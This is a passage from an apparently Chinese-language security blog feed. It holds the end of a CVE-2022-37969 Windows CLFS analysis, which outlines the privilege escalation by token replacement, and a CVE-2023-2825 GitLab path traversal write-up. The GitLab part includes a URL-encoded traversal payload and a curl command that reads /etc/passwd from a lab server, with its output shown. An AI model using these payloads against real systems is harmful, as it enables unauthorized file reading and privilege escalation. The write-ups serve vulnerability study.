class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateClientContextOffsets</span>(</span></span><span style="display:flex;"><span> CClfsBaseFile<span style="color:#f92672">*</span>this,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _RTL_AVL_TABLE<span style="color:#f92672">*</span>a2,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> a3)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> Symbol;<span style="color:#75715e">// ebx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v4;<span style="color:#75715e">// r14d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v5;<span style="color:#75715e">// rdi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v8;<span style="color:#75715e">// esi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> CClfsBaseFile<span style="color:#f92672">*</span>v9;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> _CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>v10;<span style="color:#75715e">// r8</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>.....</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)a3<span style="color:#f92672">+</span> v5<span style="color:#f92672">+</span><span style="color:#ae81ff">78</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v8<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">0xFFFFFFFD</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span>v4;</span></span><span style="display:flex;"><span> Symbol<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateCheckifWithinSymbolZone</span>(this, v8<span style="color:#f92672">+</span><span style="color:#ae81ff">135</span>, a3);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( Symbol<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span> Symbol<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateCheckifWithinSymbolZone</span>(v9, v8<span style="color:#f92672">-</span><span style="color:#ae81ff">48</span>, v10);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( Symbol<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">OffsetToAddr</span>(this, v8);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>v11 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(v11<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v12<span style="color:#f92672">!=</span> v8 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(v11<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">!=</span> v12<span style="color:#f92672">+</span><span style="color:#ae81ff">136</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span> v19<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> Symbol<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetSymbol</span>(this, v8, v5,<span style="color:#f92672">&amp;</span>v19);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( Symbol<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span><span style="color:#f92672">*</span>)v19<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">!=</span> (_DWORD)v5 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)v19<span style="color:#f92672">!=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1040322553</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span> Buffer<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)a3<span style="color:#f92672">+</span> v5<span style="color:#f92672">+</span><span style="color:#ae81ff">78</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">48</span>;</span></span><span style="display:flex;"><span> inserted<span style="color:#f92672">=</span><span style="color:#a6e22e">RtlInsertElementGenericTableAvl</span>(a2,<span style="color:#f92672">&amp;</span>Buffer,<span style="color:#ae81ff">8u</span>,<span style="color:#f92672">&amp;</span>NewElement);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>NewElement<span style="color:#f92672">||</span><span style="color:#f92672">!</span>inserted )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(v5<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v5<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x7C</span> );</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v4<span style="color:#f92672">!=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ClientCount</span>(this) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)Symbol;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><code>CClfsBaseFile::ValidateCheckifWithinSymbolZone</code>函数检查<code>cbSymbolZone</code>偏移是否处于政策范围内（处于BASE_RECORD_HEADER和BASE_RECORD之间）</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateCheckifWithinSymbolZone</span>(</span></span><span style="display:flex;"><span> CClfsBaseFile<span style="color:#f92672">*</span>this,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a2,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>a3)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( a2<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x1338</span><span style="color:#f92672">||</span> a2<span style="color:#f92672">-</span><span style="color:#ae81ff">4920</span><span style="color:#f92672">></span><span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)a3<span style="color:#f92672">+</span><span style="color:#ae81ff">1226</span>) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3222929421</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h3 id="小结">小结</h3><p>这次漏洞的造成原因是自身的<code>SignatureOffset</code>和自身的<code>Signatures</code>相交，导致攻击者可以利用循环写入<code>Signatures</code>的时候覆盖<code>SignatureOffset</code>，从而绕过<code>ResetLog</code>中的边界检查，同时未检查<code>BASE_RECORD_HEADER</code> + cbSymbolZone是否位于当前的<code>BASE_RECORD</code>中，导致攻击者可以利用漏洞通过memset函数对任意地址的一定大小的内存进行清零。</p><p>在实际利用中通过清零pContainer指针的高五位同时在用户层通过堆布局伪造CClfsContainer对象，在解引用对象指针时获取到执行代码的时机。通过结合Pipe对象和内核的两个函数成功获得任意读和任意写，从而成功将当前进程的Token替换成系统进程的token，达成提权。利用过程</p><p>在漏洞补丁中增加了对<code>cbSymbolZone</code>和<code>Client Context</code>的检查从而在漏洞利用初期阻断。</p><p>总的来说该漏洞形成原因是代码调用某些函数时未检查边界且该边界用户可控或间接可控。</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://github.com/fortra/CVE-2022-37969" target="_blank">https://github.com/fortra/CVE-2022-37969</a></p><p><a href="https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part2-exploit-analysis" target="_blank">https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part2-exploit-analysis</a></p><p><a href="https://mp.weixin.qq.com/s/GMzbavzltM756Fb8lw6h_A" target="_blank">https://mp.weixin.qq.com/s/GMzbavzltM756Fb8lw6h_A</a></p><p><a href="https://bbs.kanxue.com/thread-275566.htm#msg_header_h3_0" target="_blank">https://bbs.kanxue.com/thread-275566.htm#msg_header_h3_0</a></p><p><a href="https://www.geoffchappell.com/" target="_blank">https://www.geoffchappell.com/</a></p><p><a href="https://github.com/ionescu007/clfs-docs" target="_blank">https://github.com/ionescu007/clfs-docs</a></p><p><a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf" target="_blank">https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf</a></p><p><a href="https://www.52pojie.cn/thread-1817452-1-1.html" target="_blank">https://www.52pojie.cn/thread-1817452-1-1.html</a></p></blockquote><p><strong>Created at 2023-05-26T10:56:00+08:00</strong></p></description></item><item><title>CVE-2023-2825 Gitlab 路径穿越漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/</link><pubDate>Fri, 26 May 2023 10:36:20 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/</guid><description><h3 id="基本信息">基本信息</h3><p>在GitLab 中，当一个附件存在于一个项目中，并且该项目在嵌套了至少五层的组内，攻击者才可以利用这个漏洞进行目录穿越，读取服务器上的文件。</p><h3 id="影响版本">影响版本</h3><p>GitLab 16.0.0</p><h3 id="环境搭建">环境搭建</h3><p>用docker起环境</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker pull gitlab/gitlab-ce:16.0.0-ce.0</span></span><span style="display:flex;"><span>docker run -d -p 443:443 -p 80:80 -p 222:22 --name gitlab --restart always -v /home/gitlab/config:/etc/gitlab -v /home/gitlab/logs:/var/log/gitlab -v /home/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:16.0.0-ce.0</span></span></code></pre></div><h3 id="技术分析调试">技术分析&amp;调试</h3><p>一开始以为是普通的目录穿越，先diff看怎么修的，注意到16.0.1新增了<code>spec\support\shared_examples\requests\uploads_actions_shared_examples.rb</code> 文件。</p><p><img alt="Untitled" src="/images/vulnerability/CVE-2023-2825-gitlab-path-traversal.zh-cn.assets/1.png"/></p><p>根据该文件内容判断应该是这个漏洞的单元测试文件，没学过ruby，先把这段代码扔给ChatGPT看看</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># frozen_string_literal: true</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>RSpec.shared_examples<span style="color:#e6db74">'uploads actions'</span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> describe<span style="color:#e6db74">"GET #show"</span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> context<span style="color:#e6db74">'with file traversal in filename parameter'</span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># Uploads in tests are stored in directories like:</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET</span></span></span><span style="display:flex;"><span> let<span style="color:#f92672">(</span>:filename<span style="color:#f92672">)</span><span style="color:#f92672">{</span><span style="color:#e6db74">"../../../../../../../../../Gemfile.lock"</span><span style="color:#f92672">}</span></span></span><span style="display:flex;"><span> let<span style="color:#f92672">(</span>:escaped_filename<span style="color:#f92672">)</span><span style="color:#f92672">{</span> CGI.escape filename<span style="color:#f92672">}</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> it<span style="color:#e6db74">'responds with status 400'</span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># Check files do indeed exists</span></span></span><span style="display:flex;"><span> upload_absolute_path<span style="color:#f92672">=</span> Pathname<span style="color:#f92672">(</span>upload.absolute_path<span style="color:#f92672">)</span></span></span><span style="display:flex;"><span> expect<span style="color:#f92672">(</span>upload_absolute_path<span style="color:#f92672">)</span>.to be_exist</span></span><span style="display:flex;"><span> attacked_file_path<span style="color:#f92672">=</span> upload_absolute_path.dirname.join<span style="color:#f92672">(</span>filename<span style="color:#f92672">)</span></span></span><span style="display:flex;"><span> expect<span style="color:#f92672">(</span>attacked_file_path<span style="color:#f92672">)</span>.to be_exist</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e"># Need to escape, otherwise we get `ActionController::UrlGenerationError Exception: No route matches`</span></span></span><span style="display:flex;"><span> get show_path.sub<span style="color:#f92672">(</span>File.basename<span style="color:#f92672">(</span>upload.path<span style="color:#f92672">)</span>, escaped_filename<span style="color:#f92672">)</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> expect<span style="color:#f92672">(</span>response<span style="color:#f92672">)</span>.to have_gitlab_http_status<span style="color:#f92672">(</span>:bad_request<span style="color:#f92672">)</span></span></span><span style="display:flex;"><span> end</span></span><span style="display:flex;"><span> end</span></span><span style="display:flex;"><span> end</span></span><span style="display:flex;"><span>end</span></span></code></pre></div><p>ChatGPT回答：</p><pre tabindex="0"><code>这段Ruby代码定义了一个RSpec共享示例，名为“uploads actions”，它包含一个测试用例。这个测试用例测试了在文件名参数中发生文件遍历攻击时服务器的响应行为。
在测试用例中，首先定义了两个变量：filename和escaped_filename。filename变量是一个字符串，它代表将被攻击的文件名。escaped_filename变量是对filename进行URL编码后的结果，这是为了避免请求URL中使用不安全的字符可能会导致意外的结果。
然后，该测试用例检查上传的文件是否存在，之后构造一个恶意URL请求来执行文件遍历攻击，请求一个非法文件。具体而言，它使用Pathname类来获取上传文件的绝对路径，然后使用File.basename和String#sub方法来构造恶意URL请求。最后，使用RSpec的expect语句来检查服务器的响应状态码是否为400（bad_request）。
总之，这个RSpec共享示例测试了服务器是否能够防止文件遍历攻击，并正确地处理恶意请求。</code></pre><p>根据有限的知识结合ChatGPT回答，可以知道这段代码首先定义了目录穿越的payload：<code>../../../../../../../../../Gemfile.lock</code> 而后将其进行url编码并赋值给escaped_filename。</p><p>之后将上传目录的路径和这个payload拼接并判断这个路径是否存在。之后通过String.sub函数将上传路径的文件名替换成了escaped_filename，并用<code>RSpec</code> 框架的get函数发起请求。</p><p>结合该单元测试的注释，可以知道，大概payload如下</p><pre tabindex="0"><code>/url/to/upload/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2FGemfile%2Elock</code></pre><pre tabindex="0"><code># Uploads in tests are stored in directories like:
# tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET</code></pre><p>在通过官方文档知道如何通过API上传附件</p><pre tabindex="0"><code>curl --request POST --header "PRIVATE-TOKEN: &lt;your_access_token>" \
--form "file=@dk.png" "https://gitlab.example.com/api/v4/projects/5/uploads"</code></pre><blockquote><p><a href="https://github.com/gitlabhq/gitlabhq/blob/master/doc/api/projects.md#upload-a-file" target="_blank">https://github.com/gitlabhq/gitlabhq/blob/master/doc/api/projects.md#upload-a-file</a></p></blockquote><p>这里先用Administrator上传一个附件看看（已提前建好相应的组和项目）</p><pre tabindex="0"><code>$ curl --request POST --header "PRIVATE-TOKEN: glpat-Py3rEGA_SPngPn-2LzsR" --form "file=@3.txt" "http://192.168.59.197/api/v4/projects/g1%2Fg2%2Fg3%2Fg4%2Fg5%2Fg6%2Fg7%2Fg8%2Fg9%2Fp4/uploads"
{"alt":"3.txt","url":"/uploads/3fc9a510049cd6bbee4507d21164020f/3.txt","full_pat
h":"/g1/g2/g3/g4/g5/g6/g7/g8/g9/p4/uploads/3fc9a510049cd6bbee4507d21164020f/3.tx
t","markdown":"[3.txt](/uploads/3fc9a510049cd6bbee4507d21164020f/3.txt)"}</code></pre><p>可以看到已经返回了一个url，不难看出和单元测试里面的注释的路径长得很像，这里用自己的payload替换3.txt</p><pre tabindex="0"><code>$ curl http://192.168.59.197/g1/g2/g3/g4/g5/g6/g7/g8/g9/p4/uploads/3fc9a510049cd6bbee4507d21164020f/%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2fpasswd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologi
n
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh</code></pre><p><strong>分析</strong></p><p>到现在有两个问题</p><ol><li>为什么要求payload需要经过url编码</li><li>为什么要12个穿越符才能到根目录</li><li>在哪个代码触发的漏洞</li></ol><p>首先是第一个问题，GitLab架构为<code>nginx ↔Workhorse↔puma</code>，起初以为将目录穿越进行url编码是绕过nginx解析，举个例子，当访问<code>/1/2/3/4/5/6/../../../index.php</code>时nginx实际会访问/1/2/3/index.php，即会进行拼接然后访问，所以一开始判断的是将payload进行url编码绕过这个过程，而后和其他师傅讨论才发现，虽然将payload进行编码但nginx会将url里面url编码的部分进行解码然后拼接，所以url编码不是为了绕过nginx解析。在前面使用api上传文件时，文档特别强调了上传目标路径需要进行url编码，这里推测应该是GitLab内会进行url解码在进行处理。</p><p>第二个问题为什么需要12个穿越符，经过测试发现文件实际上传在<code>/var/opt/gitlab/gitlab-rails/uploads/@hashed</code> 目录下，但在代码中使用的是<code>/opt/gitlab/embedded/service/gitlab-rails/public/uploads/@hashed/</code> 其中<code>uploads</code>软连接到了<code>/var/opt/gitlab/gitlab-rails/uploads</code>目录，在上传一个文件后，文件路径为<code>/opt/gitlab/embedded/service/gitlab-rails/public/uploads/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a/34c2b7fc66dcfbfe0b65513260ad0510/3.txt</code> 不难看出共有12层目录所以需要12个穿越符，在触发漏洞时url为<code>/path/to/group/project/uploads/@hashed</code>，结合绕过nginx解析，所以至少需要9个组才能有足够的嵌套层数绕过nginx的url解析。</p><p>第三个问题，回到补丁对比，补丁主要在以下两个文件添加了防护目录穿越的代码，在show方法处对filename进行url解码而后调用<code>Gitlab::Utils.check_path_traversal!(params[:filename])</code> 检查url解码后的参数是否存在目录穿越。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>app\uploaders\object_storage<span style="color:#f92672">.</span>rb</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span><span style="color:#a6e22e">retrieve_from_store!</span>(identifier)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Gitlab</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Utils</span><span style="color:#f92672">.</span>check_path_traversal!(identifier)</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e"># We need to force assign the value of @filename so that we will still</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># get the original_filename in cases wherein the file points to a random generated</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># path format. This happens for direct uploaded files to final location.</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># If we don't set @filename value here, the result of uploader.filename (see ObjectStorage#filename) will result</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># to the value of uploader.file.filename which will then contain the random generated path.</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># The `identifier` variable contains the value of the `file` column which is the original_filename.</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># In cases wherein we are not uploading to final location, it is still fine to set the</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># @filename with the `identifier` value because it still contains the original filename from the `file` column,</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># which is what we want in either case.</span></span></span><span style="display:flex;"><span> @filename<span style="color:#f92672">=</span> identifier<span style="color:#75715e"># rubocop: disable Gitlab/ModuleWithInstanceVariables</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">super</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>app\controllers\concerns\uploads_actions<span style="color:#f92672">.</span>rb</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span><span style="color:#a6e22e">show</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">Gitlab</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Utils</span><span style="color:#f92672">.</span>check_path_traversal!(params<span style="color:#f92672">[</span><span style="color:#e6db74">:filename</span><span style="color:#f92672">]</span>)</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> render_404<span style="color:#66d9ef">unless</span> uploader<span style="color:#f92672">&amp;.</span>exists?</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> ttl, directives<span style="color:#f92672">=</span><span style="color:#f92672">*</span>cache_settings</span></span><span style="display:flex;"><span> ttl<span style="color:#f92672">||=</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span> directives<span style="color:#f92672">||=</span> {<span style="color:#66d9ef">private</span>:<span style="color:#66d9ef">true</span>,<span style="color:#e6db74">must_revalidate</span>:<span style="color:#66d9ef">true</span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> expires_in ttl, directives</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> file_uploader<span style="color:#f92672">=</span><span style="color:#f92672">[</span>uploader,<span style="color:#f92672">*</span>uploader<span style="color:#f92672">.</span>versions<span style="color:#f92672">.</span>values<span style="color:#f92672">].</span>find<span style="color:#66d9ef">do</span><span style="color:#f92672">|</span>version<span style="color:#f92672">|</span></span></span><span style="display:flex;"><span> version<span style="color:#f92672">.</span>filename<span style="color:#f92672">==</span> params<span style="color:#f92672">[</span><span style="color:#e6db74">:filename</span><span style="color:#f92672">]</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> render_404<span style="color:#66d9ef">unless</span> file_uploader</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> workhorse_set_content_type!</span></span><span style="display:flex;"><span> send_upload(file_uploader,<span style="color:#e6db74">attachment</span>: file_uploader<span style="color:#f92672">.</span>filename,<span style="color:#e6db74">disposition</span>: content_disposition)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span></code></pre></div><p>再来看<code>Gitlab::Utils.check_path_traversal</code>函数，其定义在<code>lib\gitlab\utils.rb</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">def</span><span style="color:#a6e22e">check_path_traversal!</span>(path)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">unless</span> path</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> path<span style="color:#f92672">=</span> path<span style="color:#f92672">.</span>to_s<span style="color:#66d9ef">if</span> path<span style="color:#f92672">.</span>is_a?(<span style="color:#66d9ef">Gitlab</span><span style="color:#f92672">::</span><span style="color:#66d9ef">HashedPath</span>)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">raise</span><span style="color:#66d9ef">PathTraversalAttackError</span>,<span style="color:#e6db74">'Invalid path'</span><span style="color:#66d9ef">unless</span> path<span style="color:#f92672">.</span>is_a?(String)</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> path<span style="color:#f92672">=</span> decode_path(path)</span></span><span style="display:flex;"><span> path_regex<span style="color:#f92672">=</span><span style="color:#e6db74">%r{(\A(\.{1,2})\z|\A\.\.[/\\]|[/\\]\.\.\z|[/\\]\.\.[/\\]|\n)}</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> path<span style="color:#f92672">.</span>match?(path_regex)</span></span><span style="display:flex;"><span> logger<span style="color:#f92672">.</span>warn(<span style="color:#e6db74">message</span>:<span style="color:#e6db74">"Potential path traversal attempt detected"</span>,<span style="color:#e6db74">path</span>:<span style="color:#e6db74">"</span><span style="color:#e6db74">#{</span>path<span style="color:#e6db74">}</span><span style="color:#e6db74">"</span>)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">raise</span><span style="color:#66d9ef">PathTraversalAttackError</span>,<span style="color:#e6db74">'Invalid path'</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> path</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span></code></pre></div><p>这个函数接收一个路径，而后用正则表达式进行匹配，如果匹配到了则抛出<code>PathTraversalAttackError</code> 错误，把这段正则表达式给ChatGPT，给出了如下解释，所以代码调用这个函数可以检查是否存在恶意的目录穿越。</p><pre 